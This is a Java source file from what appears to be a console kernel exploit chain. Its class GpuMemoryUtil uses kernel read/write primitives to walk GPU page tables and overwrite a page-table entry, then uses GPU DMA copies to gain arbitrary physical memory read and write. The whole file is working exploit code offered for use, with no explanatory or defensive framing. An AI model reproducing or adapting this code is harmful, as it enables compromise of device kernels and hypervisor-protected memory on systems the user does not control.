package org.exploit;

import jdk.internal.vm.annotation.ForceInline;

import org.bootstrap.Log;

public class GpuMemoryUtil {
	private static final Api api = Api.getInstance();

	private static long gpuScratchBuffer1VirtAddress;
	private static long gpuScratchBuffer1PhysAddress;
	private static long gpuScratchBuffer1RealPhysAddress;

	private static long gpuScratchBuffer1PtbVirtAddress;

	private static long gpuScratchBuffer1InitialPtbEntryForRO;
	private static long gpuScratchBuffer1ClearedPtbEntryForRO;
	private static long gpuScratchBuffer1InitialPtbEntryForRW;
	private static long gpuScratchBuffer1ClearedPtbEntryForRW;

	private static long gpuScratchBuffer2VirtAddress;
	private static long gpuScratchBuffer2PhysAddress;
	private static long gpuScratchBuffer2RealPhysAddress;

	private static Long lastGpuPhysAddress;

	private static final int GPU_SCRATCH_BUFFER_SIZE = 2 * 1024 * 1024; // 2 MiB

	static {
		Checks.ensureTrue((GPU_SCRATCH_BUFFER_SIZE & Constants.PHYS_PAGE_MASK) == 0);
	}

	private GpuMemoryUtil() {
	}

	//-------------------------------------------------------------------------

	public static boolean prepareGpuScratchBuffers() {
		if (gpuScratchBuffer1VirtAddress != 0L) {
			return true;
		}

		final Integer vmId = ProcessUtil.getVmId();
		if (vmId == null) {
			Log.warn("Getting virtual memory ID failed");
			return false;
		}

		final int vmIdValue = vmId.intValue();
		//Log.debug("Process virtual memory ID: " + vmIdValue);

		final Long scratchBuffer1PhysAddress = MemoryUtil.allocateMainDirectMemory(GPU_SCRATCH_BUFFER_SIZE, GPU_SCRATCH_BUFFER_SIZE);
		if (scratchBuffer1PhysAddress == null) {
			Log.warn("Allocating GPU scratch buffer #1 failed");
			return false;
		}
		//Log.debug("GPU scratch buffer #1 physical address: " + TypeUtil.int64ToHex(scratchBuffer1PhysAddress));

		final long scratchBuffer1RealPhysAddress = scratchBuffer1PhysAddress + Constants.DIRECT_MEM_PHYS_ADDRESS_DISPLACEMENT;
		//Log.debug("GPU scratch buffer #1 real physical address: " + TypeUtil.int64ToHex(scratchBuffer1RealPhysAddress));

		final Long scratchBuffer2PhysAddress = MemoryUtil.allocateMainDirectMemory(GPU_SCRATCH_BUFFER_SIZE, GPU_SCRATCH_BUFFER_SIZE);
		if (scratchBuffer2PhysAddress == null) {
			Log.warn("Allocating GPU scratch buffer #2 failed");
			return false;
		}
		//Log.debug("GPU scratch buffer #2 physical address: " + TypeUtil.int64ToHex(scratchBuffer2PhysAddress));

		final long scratchBuffer2RealPhysAddress = scratchBuffer2PhysAddress + Constants.DIRECT_MEM_PHYS_ADDRESS_DISPLACEMENT;
		//Log.debug("GPU scratch buffer #2 real physical address: " + TypeUtil.int64ToHex(scratchBuffer2RealPhysAddress));

		final Long scratchBuffer1VirtAddress = MemoryUtil.mapDirectMemory(scratchBuffer1PhysAddress, GPU_SCRATCH_BUFFER_SIZE, 0L, Constants.PROT_CPU_READ | Constants.PROT_CPU_WRITE | Constants.PROT_GPU_READ | Constants.PROT_GPU_WRITE, Constants.MAP_NO_COALESCE, GPU_SCRATCH_BUFFER_SIZE);
		if (scratchBuffer1VirtAddress == null) {
			Log.warn("Mapping GPU scratch buffer #1 failed");
			return false;
		}
		//Log.debug("GPU scratch buffer #1 virtual address: " + TypeUtil.int64ToHex(scratchBuffer1VirtAddress));

		final Long scratchBuffer2VirtAddress = MemoryUtil.mapDirectMemory(scratchBuffer2PhysAddress, GPU_SCRATCH_BUFFER_SIZE, 0L, Constants.PROT_CPU_READ | Constants.PROT_CPU_WRITE | Constants.PROT_GPU_READ | Constants.PROT_GPU_WRITE, Constants.MAP_NO_COALESCE, GPU_SCRATCH_BUFFER_SIZE);
		if (scratchBuffer2VirtAddress == null) {
			Log.warn("Mapping GPU scratch buffer #2 failed");
			return false;
		}
		//Log.debug("GPU scratch buffer #2 virtual address: " + TypeUtil.int64ToHex(scratchBuffer2VirtAddress));

		api.clearMemory(scratchBuffer1VirtAddress, GPU_SCRATCH_BUFFER_SIZE);
		api.clearMemory(scratchBuffer2VirtAddress, GPU_SCRATCH_BUFFER_SIZE);

		final long[] result = GpuMemoryUtil.getPhysicalPageSizeByVmIdEx(vmIdValue, scratchBuffer1VirtAddress);
		if (result == null) {
			Log.warn("Getting physical page size of GPU scratch buffer #1 failed");
			return false;
		}

		final long pageSize = result[0];
		//Log.debug("Page size: " + TypeUtil.int64ToHex(pageSize));
		if (pageSize != GPU_SCRATCH_BUFFER_SIZE) {
			Log.warn("Unexpected page size " + TypeUtil.int64ToHex(pageSize));
			return false;
		}

		final long ptbVirtAddress = result[1];
		//Log.debug("GPU scratch buffer #1 PTB virtual address: " + TypeUtil.int64ToHex(ptbVirtAddress));

		if (!MemoryUtil.protectMemory(scratchBuffer1VirtAddress, GPU_SCRATCH_BUFFER_SIZE, Constants.PROT_CPU_READ | Constants.PROT_CPU_WRITE | Constants.PROT_GPU_READ)) {
			Log.warn("Protecting memory of GPU scratch buffer #1 failed");
			return false;
		}

		final long initialPtbEntryForRO = api.readKernel64(ptbVirtAddress);
		//Log.debug("GPU scratch buffer #1 initial PTB entry (RO): " + TypeUtil.int64ToHex(initialPtbEntryForRO));

		final long clearedPtbEntryForRO = initialPtbEntryForRO & ~scratchBuffer1RealPhysAddress;
		//Log.debug("GPU scratch buffer #1 cleared PTB entry (RO): " + TypeUtil.int64ToHex(clearedPtbEntryForRO));

		if (!MemoryUtil.protectMemory(scratchBuffer1VirtAddress, GPU_SCRATCH_BUFFER_SIZE, Constants.PROT_CPU_READ | Constants.PROT_CPU_WRITE | Constants.PROT_GPU_READ | Constants.PROT_GPU_WRITE)) {
			Log.warn("Protecting memory of GPU scratch buffer #1 failed");
			return false;
		}

		final long initialPtbEntryForRW = api.readKernel64(ptbVirtAddress);
		//Log.debug("GPU scratch buffer #1 initial PTB entry (RW): " + TypeUtil.int64ToHex(initialPtbEntryForRW));

		final long clearedPtbEntryForRW = initialPtbEntryForRW & ~scratchBuffer1RealPhysAddress;
		//Log.debug("GPU scratch buffer #1 cleared PTB entry (RW): " + TypeUtil.int64ToHex(clearedPtbEntryForRW));

		gpuScratchBuffer1VirtAddress = scratchBuffer1VirtAddress;
		gpuScratchBuffer1PhysAddress = scratchBuffer1PhysAddress;
		gpuScratchBuffer1RealPhysAddress = scratchBuffer1RealPhysAddress;

		gpuScratchBuffer2VirtAddress = scratchBuffer2VirtAddress;
		gpuScratchBuffer2PhysAddress = scratchBuffer2PhysAddress;
		gpuScratchBuffer2RealPhysAddress = scratchBuffer2RealPhysAddress;

		gpuScratchBuffer1PtbVirtAddress = ptbVirtAddress;
		gpuScratchBuffer1InitialPtbEntryForRO = initialPtbEntryForRO;
		gpuScratchBuffer1ClearedPtbEntryForRO = clearedPtbEntryForRO;
		gpuScratchBuffer1InitialPtbEntryForRW = initialPtbEntryForRW;
		gpuScratchBuffer1ClearedPtbEntryForRW = clearedPtbEntryForRW;

		return true;
	}

	//-------------------------------------------------------------------------

	public static interface PhysicalXferBufferProcessor {
		public abstract Boolean processChunk(long chunkVirtAddress, int chunkSize);
	}

	private static synchronized boolean physicalXferBufferInternal(long physAddress, int size, PhysicalXferBufferProcessor processor, boolean isWrite) {
		Checks.ensurePhysicalAddressRange(physAddress, size);
		Checks.ensureTrue((physAddress >>> 32) != 0xFFFFFFFFL); // Avoid passing of kernel pointers
		Checks.ensureTrue(size >= 0 && size <= GPU_SCRATCH_BUFFER_SIZE);

		final long truncPhysAddress = physAddress & ~(GPU_SCRATCH_BUFFER_SIZE - 1);
		final int offset = (int)(physAddress - truncPhysAddress);

		if (size == 0) {
			if (processor != null) {
				final Boolean result = processor.processChunk(gpuScratchBuffer2VirtAddress + offset, 0);
				if (result != null && !result.booleanValue()) {
					return false;
				}
			}

			return true;
		}

		final int protRO = Constants.PROT_CPU_READ | Constants.PROT_CPU_WRITE | Constants.PROT_GPU_READ;
		final int protRW = protRO | Constants.PROT_GPU_WRITE;

		// Optimize read/write by checking if last request used same physical page.
		final boolean wasMapped = lastGpuPhysAddress != null;

		final boolean needInvalidate;
		if (!wasMapped || lastGpuPhysAddress.longValue() != truncPhysAddress) {
			needInvalidate = true;
		} else {
			needInvalidate = false;
		}

		boolean status = false;

		if (needInvalidate) {
			if (wasMapped) {
				api.writeKernel64(gpuScratchBuffer1PtbVirtAddress, gpuScratchBuffer1InitialPtbEntryForRW);

				if (!MemoryUtil.protectMemory(gpuScratchBuffer1VirtAddress, GPU_SCRATCH_BUFFER_SIZE, protRW)) {
					Log.warn("Protecting memory #1 failed");
				}
			}

			if (MemoryUtil.protectMemory(gpuScratchBuffer1VirtAddress, GPU_SCRATCH_BUFFER_SIZE, protRO)) {
				final long newPtb = gpuScratchBuffer1ClearedPtbEntryForRO | truncPhysAddress;
				api.writeKernel64(gpuScratchBuffer1PtbVirtAddress, newPtb);

				if (MemoryUtil.protectMemory(gpuScratchBuffer1VirtAddress, GPU_SCRATCH_BUFFER_SIZE, protRW)) {
					lastGpuPhysAddress = new Long(truncPhysAddress);
					status = true;
				} else {
					Log.warn("Protecting memory #3 failed");
				}
			} else {
				Log.warn("Protecting memory #2 failed");
			}
		} else {
			status = true;
		}

		if (status) {
			api.clearMemory(gpuScratchBuffer2VirtAddress + offset, size);

			status = false;

			if (isWrite) {
				if (processor != null) {
					final Boolean result = processor.processChunk(gpuScratchBuffer2VirtAddress + offset, size);
					if (result == null || result.booleanValue()) {
						status = true;
					}

					if (status) {
						api.copyDirectMemoryDMA(gpuScratchBuffer1VirtAddress + offset, gpuScratchBuffer2VirtAddress + offset, size);
					}
				} else {
					status = true;
				}
			} else {
				if (processor != null) {
					api.copyDirectMemoryDMA(gpuScratchBuffer2VirtAddress + offset, gpuScratchBuffer1VirtAddress + offset, size);

					final Boolean result = processor.processChunk(gpuScratchBuffer2VirtAddress + offset, size);
					if (result == null || result.booleanValue()) {
						status = true;
					}
				} else {
					status = true;
				}
			}
		}

		return status;
	}

	private static boolean physicalXferBufferInternal(long physAddress, int size, PhysicalXferBufferProcessor processor) {
		return physicalXferBufferInternal(physAddress, size, processor, false);
	}

	// XXX: If hypervisor is not exploited then this method returns FFs whilst
	// accessing protected memory regions.
	private static boolean physicalXferBuffer(long physAddress, long size, PhysicalXferBufferProcessor processor, boolean isWrite) {
		Checks.ensurePhysicalAddressRange(physAddress, size);
		Checks.ensureNotNull(processor);

		final long truncPhysAddress = physAddress & ~(GPU_SCRATCH_BUFFER_SIZE - 1);
		final int offset = (int)(physAddress - truncPhysAddress);
		final int chunkSize = GPU_SCRATCH_BUFFER_SIZE - offset;

		final String opType = isWrite ? "Writing" : "Reading";

		class ProxyProcessor implements MemoryUtil.MemoryRangeProcessor {
			private final PhysicalXferBufferProcessor processor;

			public ProxyProcessor(PhysicalXferBufferProcessor processor) {
				this.processor = processor;
			}

			public Boolean processChunk(long address, long size, boolean isLastChunk) {
				if (!processor.processChunk(address, (int)size)) {
					Log.warn("Proxying chunk of virtual memory at " + TypeUtil.int64ToHex(address) + " of size " + TypeUtil.int64ToHex(size) + " failed");
					return false;
				}

				return true;
			}
		}

		class InnerVirtProcessor implements PhysicalXferBufferProcessor {
			private final PhysicalXferBufferProcessor processor;

			public InnerVirtProcessor(PhysicalXferBufferProcessor processor) {
				this.processor = processor;
			}

			public Boolean processChunk(long address, int size) {
				final boolean status;

				if (MemoryUtil.tryProcessMemoryRange(address, size, new ProxyProcessor(processor), MemoryUtil.MEMORY_KIND_USER, chunkSize)) {
					status = true;
				} else {
					Log.warn(opType + " virtual memory at " + TypeUtil.int64ToHex(address) + " of size " + TypeUtil.int32ToHex(size) + " with chunk size " + TypeUtil.int32ToHex(chunkSize) + " failed");
					status = false;
				}

				return new Boolean(status);
			}
		}

		class OuterPhysProcessor implements MemoryUtil.MemoryRangeProcessor {
			private InnerVirtProcessor innerProcessor;
			private boolean isWrite;

			public OuterPhysProcessor(PhysicalXferBufferProcessor processor, boolean isWrite) {
				this.innerProcessor = new InnerVirtProcessor(processor);
				this.isWrite = isWrite;
			}

			public Boolean processChunk(long physAddress, long size, boolean isLastChunk) {
				final boolean status;

				if (physicalXferBufferInternal(physAddress, (int)size, this.innerProcessor, this.isWrite)) {
					status = true;
				} else {
					Log.warn(opType + " chunk of physical memory at " + TypeUtil.int64ToHex(physAddress) + " of size " + TypeUtil.int64ToHex(size) + " failed");
					status = false;
				}

				return new Boolean(status);
			}
		}

		boolean status = true;

		if (!MemoryUtil.tryProcessMemoryRange(physAddress, size, new OuterPhysProcessor(processor, isWrite), MemoryUtil.MEMORY_KIND_PHYSICAL, chunkSize)) {
			Log.warn(opType + " physical memory at " + TypeUtil.int64ToHex(physAddress) + " of size " + TypeUtil.int64ToHex(size) + " with chunk size " + TypeUtil.int32ToHex(chunkSize) + " failed");
			status = false;
		}

		return status;
	}

	@ForceInline
	public static boolean physicalXferBuffer(long physAddress, long size, PhysicalXferBufferProcessor processor) {
		return physicalXferBuffer(physAddress, size, processor, false);
	}

	@ForceInline
	public static boolean physicalCopyIn(long physAddress, long size, PhysicalXferBufferProcessor processor) {
		return physicalXferBuffer(physAddress, size, processor, false);
	}

	@ForceInline
	public static boolean physicalCopyOut(long physAddress, long size, PhysicalXferBufferProcessor processor) {
		return physicalXferBuffer(physAddress, size, processor, true);
	}

	//-------------------------------------------------------------------------

	public static long[] getPhysicalPageSizeEx(long pdb2VirtAddress, long virtRelAddress) {
		//
		// PDB2
		//

		final long pml4EntryVirtAddress = MemoryUtil.getPML4EntryAddress(pdb2VirtAddress, virtRelAddress);
		if (pml4EntryVirtAddress == 0L) {
			Log.warn("Getting PML4 entry virtual address failed");
			return null;
		}
		//Log.debug("PML4 entry virtual address: " + TypeUtil.int64ToHex(pml4EntryVirtAddress));

		final long pml4Entry = api.readKernel64(pml4EntryVirtAddress);
		//Log.debug("PML4 entry: " + TypeUtil.int64ToHex(pml4Entry));

		if ((pml4Entry & Constants.GPU_PG_PDE_VALID) == 0L) {
			Log.warn("Bad PML4 entry " + TypeUtil.int64ToHex(pml4Entry));
			return null;
		}

		long framePhysAddress;

		//
		// PDB1
		//

		framePhysAddress = pml4Entry & Constants.GPU_PG_PDE_FRAME;
		//Log.debug("Frame physical address: " + TypeUtil.int64ToHex(framePhysAddress));

		final long pdpEntriesVirtAddress = MemoryUtil.physAddressToDirectMapAddress(framePhysAddress);
		//Log.debug("PDP entries virtual address: " + TypeUtil.int64ToHex(pdpEntriesVirtAddress));

		final int pdpEntryIndex = MemoryUtil.getPDPEntryIndex(virtRelAddress);
		//Log.debug("PDP index: " + pdpEntryIndex);

		final long pdpEntryVirtAddress = pdpEntriesVirtAddress + pdpEntryIndex * Offsets.sizeOf_pdp_entry_t;
		//Log.debug("PDP entry virtual address: " + TypeUtil.int64ToHex(pdpEntryVirtAddress));

		final long pdpEntry = api.readKernel64(pdpEntryVirtAddress);
		//Log.debug("PDP entry: " + TypeUtil.int64ToHex(pdpEntry));

		if ((pdpEntry & Constants.GPU_PG_PDE_VALID) == 0L) {
			Log.warn("Bad PDP entry " + TypeUtil.int64ToHex(pdpEntry));
			return null;
		}

		//
		// PDB0
		//

		framePhysAddress = pdpEntry & Constants.GPU_PG_PDE_FRAME;
		//Log.debug("Frame physical address: " + TypeUtil.int64ToHex(framePhysAddress));

		final long pdEntriesVirtAddress = MemoryUtil.physAddressToDirectMapAddress(framePhysAddress);
		//Log.debug("PD entries virtual address: " + TypeUtil.int64ToHex(pdEntriesVirtAddress));

		final int pdEntryIndex = MemoryUtil.getPDEntryIndex(virtRelAddress);
		//Log.debug("PD index: " + pdEntryIndex);

		final long pdEntryVirtAddress = pdEntriesVirtAddress + pdEntryIndex * Offsets.sizeOf_pd_entry_t;
		//Log.debug("PD entry virtual address: " + TypeUtil.int64ToHex(pdEntryVirtAddress));

		final long pdEntry = api.readKernel64(pdEntryVirtAddress);
		//Log.debug("PD entry: " + TypeUtil.int64ToHex(pdEntry));

		if ((pdEntry & Constants.GPU_PG_PDE_VALID) == 0L) {
			Log.warn("Bad PD entry " + TypeUtil.int64ToHex(pdEntry));
			return null;
		}

		if ((pdEntry & Constants.GPU_PG_PDE_PTE) != 0L) {
			final long pageSize = 0x200000L; // 2 MiB

			return new long[] { pageSize, pdEntryVirtAddress };
		}

		//
		// PTB
		//

		final long offset = virtRelAddress & Constants.PDRMASK;

		final int blockFramentSize = Helpers.getBlockFragmentSizeFromGpuPDEntry(pdEntry);

		long ptEntriesVirtAddress;
		int ptEntryIndex;
		long ptEntryVirtAddress;
		long ptEntry;

		if (blockFramentSize == 4) {
			framePhysAddress = pdEntry & Constants.GPU_PG_PDE_FRAME;
			//Log.debug("Frame physical address: " + TypeUtil.int64ToHex(framePhysAddress));

			ptEntriesVirtAddress = MemoryUtil.physAddressToDirectMapAddress(framePhysAddress);
			//Log.debug("PT entries virtual address: " + TypeUtil.int64ToHex(ptEntriesVirtAddress));

			ptEntryIndex = (int)(offset >>> 16);
			//Log.debug("PT entry index: " + ptEntryIndex);

			ptEntryVirtAddress = ptEntriesVirtAddress + ptEntryIndex * Offsets.sizeOf_pt_entry_t;
			//Log.debug("PT entry virtual address: " + TypeUtil.int64ToHex(ptEntryVirtAddress));

			ptEntry = api.readKernel64(ptEntryVirtAddress);
			//Log.debug("PT entry: " + TypeUtil.int64ToHex(ptEntry));

			final long bits = Constants.GPU_PG_PTE_TF | Constants.GPU_PG_PTE_VALID;

			if ((ptEntry & bits) == bits) {
				//Log.debug("Doing further translation");

				framePhysAddress = ptEntry & Constants.GPU_PG_PDE_FRAME;
				//Log.debug("Frame physical address: " + TypeUtil.int64ToHex(framePhysAddress));

				ptEntriesVirtAddress = MemoryUtil.physAddressToDirectMapAddress(framePhysAddress);
				//Log.debug("PT entries virtual address: " + TypeUtil.int64ToHex(ptEntriesVirtAddress));

				ptEntryIndex = (int)(virtRelAddress & 0xFFFF) >>> 13;
				//Log.debug("PT entry index: " + ptEntryIndex);

				ptEntryVirtAddress = ptEntriesVirtAddress + ptEntryIndex * Offsets.sizeOf_pt_entry_t;
				//Log.debug("PT entry virtual address: " + TypeUtil.int64ToHex(ptEntryVirtAddress));

				ptEntry = api.readKernel64(ptEntryVirtAddress);
				//Log.debug("PT entry: " + TypeUtil.int64ToHex(ptEntry));

				final long pageSize = 0x2000L; // 8 KiB

				return new long[] { pageSize, ptEntryVirtAddress };
			} else {
				final long pageSize = 0x10000L; // 64 KiB

				return new long[] { pageSize, ptEntryVirtAddress };
			}
		} else if (blockFramentSize == 1) {
			framePhysAddress = pdEntry & Constants.GPU_PG_PDE_FRAME;
			//Log.debug("Frame physical address: " + TypeUtil.int64ToHex(framePhysAddress));

			ptEntriesVirtAddress = MemoryUtil.physAddressToDirectMapAddress(framePhysAddress);
			//Log.debug("PT entries virtual address: " + TypeUtil.int64ToHex(ptEntriesVirtAddress));

			ptEntryIndex = (int)(offset >>> 13);
			//Log.debug("PT entry index: " + ptEntryIndex);

			ptEntryVirtAddress = ptEntriesVirtAddress + ptEntryIndex * Offsets.sizeOf_pt_entry_t;
			//Log.debug("PT entry virtual address: " + TypeUtil.int64ToHex(ptEntryVirtAddress));

			ptEntry = api.readKernel64(ptEntryVirtAddress);
			//Log.debug("PT entry: " + TypeUtil.int64ToHex(ptEntry));

			final long pageSize = 0x2000L; // 8 KiB

			return new long[] { pageSize, ptEntryVirtAddress };
		}

		return null;
	}

	@ForceInline
	public static long getPhysicalPageSize(long pdb2VirtAddress, long virtRelAddress) {
		final long[] result = getPhysicalPageSizeEx(pdb2VirtAddress, virtRelAddress);
		if (result == null) {
			return 0L;
		}

		return result[0];
	}

	@ForceInline
	public static long[] getPhysicalPageSizeByVmIdEx(int vmid, long virtAddress) {
		final Long virtRelAddress = getVirtualRelativeAddress(vmid, virtAddress);
		if (virtRelAddress == null) {
			Log.warn("Bad virtual address " + TypeUtil.int64ToHex(virtAddress) + " for VM ID #" + vmid);
			return null;
		}

		final long pdb2EntriesVirtAddress = getPDB2Address(vmid);
		//Log.debug("PDB2 entries virtual address: " + TypeUtil.int64ToHex(pdb2EntriesVirtAddress));

		return getPhysicalPageSizeEx(pdb2EntriesVirtAddress, virtRelAddress.longValue());
	}

	@ForceInline
	public static long getPhysicalPageSizeByVmId(int vmid, long virtAddress) {
		final long[] result = getPhysicalPageSizeByVmIdEx(vmid, virtAddress);
		if (result == null) {
			return 0L;
		}

		return result[0];
	}

	//-------------------------------------------------------------------------

	@ForceInline
	public static long getGvmSpaceAddress(int vmid) {
		Checks.ensureTrue(vmid >= 0 && vmid < Constants.GVM_MAX_VMIDS);

		Checks.ensureNotZero(Offsets.addressOf_kernel__gbase_vmspaces);

		final long gvmSpaceAddress = Offsets.addressOf_kernel__gbase_vmspaces + vmid * Offsets.sizeOf_gvmspace;

		return gvmSpaceAddress;
	}

	@ForceInline
	public static long getPDB2Address(int vmid) {
		final long gvmSpaceAddress = getGvmSpaceAddress(vmid);
		final long pdb2EntriesVirtAddress = api.readKernel64(gvmSpaceAddress + Offsets.offsetOf_gvmspace_page_dir_va);

		return pdb2EntriesVirtAddress;
	}

	@ForceInline
	public static Long getVirtualRelativeAddress(int vmid, long virtAddress) {
		Checks.ensureUserAddress(virtAddress);

		final long gvmSpaceAddress = getGvmSpaceAddress(vmid);
		//Log.debug("GVM space address: " + TypeUtil.int64ToHex(gvmSpaceAddress));

		final long size = api.readKernel64(gvmSpaceAddress + Offsets.offsetOf_gvmspace_size);
		//Log.debug("Size: " + TypeUtil.int64ToHex(size));

		final long startVirtAddress = api.readKernel64(gvmSpaceAddress + Offsets.offsetOf_gvmspace_start_va);
		//Log.debug("Start virtual address: " + TypeUtil.int64ToHex(startVirtAddress));

		final long endVirtAddress = MathUtil.addUnsigned(startVirtAddress, size);
		//Log.debug("End virtual address: " + TypeUtil.int64ToHex(endVirtAddress));

		if (!(TypeUtil.compareUnsigned(virtAddress, startVirtAddress) >= 0 && TypeUtil.compareUnsigned(virtAddress, endVirtAddress) < 0)) {
			return null;
		}

		final long virtRelAddress = MathUtil.subUnsigned(virtAddress, startVirtAddress);
		//Log.debug("Virtual address (within GVM space): " + TypeUtil.int64ToHex(virtRelAddress));

		return new Long(virtRelAddress);
	}

	//-------------------------------------------------------------------------

	public static long[] virtualAddressToPhysicalEx(long pdb2VirtAddress, long virtRelAddress) { // `gbase_vtophys`
		final long[] result = getPhysicalPageSizeEx(pdb2VirtAddress, virtRelAddress);
		if (result == null) {
			Log.warn("Getting physical page size failed");
			return null;
		}

		final long pageSize = result[0];
		//Log.debug("Page size: " + TypeUtil.int64ToHex(pageSize));

		final long ptbVirtAddress = result[1];
		//Log.debug("PTB virtual address: " + TypeUtil.int64ToHex(ptbVirtAddress));

		final long ptbEntry = api.readKernel64(ptbVirtAddress);
		//Log.debug("PTB entry: " + TypeUtil.int64ToHex(ptbEntry));

		if ((ptbEntry & Constants.GPU_PG_PTE_VALID) == 0L) {
			Log.warn("Bad PTB entry " + TypeUtil.int64ToHex(ptbEntry));
			return null;
		}

		final long framePhysAddress = (ptbEntry & ~pageSize) & Constants.GPU_PG_PTE_FRAME;
		//Log.debug("Frame physical address: " + TypeUtil.int64ToHex(framePhysAddress));

		final long physAddress = framePhysAddress | (virtRelAddress & (pageSize - 1));
		//Log.debug("Physical address: " + TypeUtil.int64ToHex(physAddress));

		return new long[] { physAddress, ptbVirtAddress };
	}

	@ForceInline
	public static long[] virtualAddressToPhysicalExByVmId(int vmid, long virtAddress) { // `gbase_vtophys`
		final Long virtRelAddress = getVirtualRelativeAddress(vmid, virtAddress);
		if (virtRelAddress == null) {
			Log.warn("Bad virtual address " + TypeUtil.int64ToHex(virtAddress) + " for VM ID #" + vmid);
			return null;
		}

		final long pdb2EntriesVirtAddress = getPDB2Address(vmid);
		//Log.debug("PDB2 entries virtual address: " + TypeUtil.int64ToHex(pdb2EntriesVirtAddress));

		return virtualAddressToPhysicalEx(pdb2EntriesVirtAddress, virtRelAddress.longValue());
	}

	@ForceInline
	public static long virtualAddressToPhysical(long pdb2VirtAddress, long virtRelAddress) { // `gbase_vtophys`
		final long[] result = virtualAddressToPhysicalEx(pdb2VirtAddress, virtRelAddress);
		if (result == null) {
			return 0L;
		}

		return result[0];
	}

	@ForceInline
	public static long virtualAddressToPhysicalByVmId(int vmid, long virtAddress) { // `gbase_vtophys`
		final long[] result = virtualAddressToPhysicalExByVmId(vmid, virtAddress);
		if (result == null) {
			return 0L;
		}

		return result[0];
	}
}
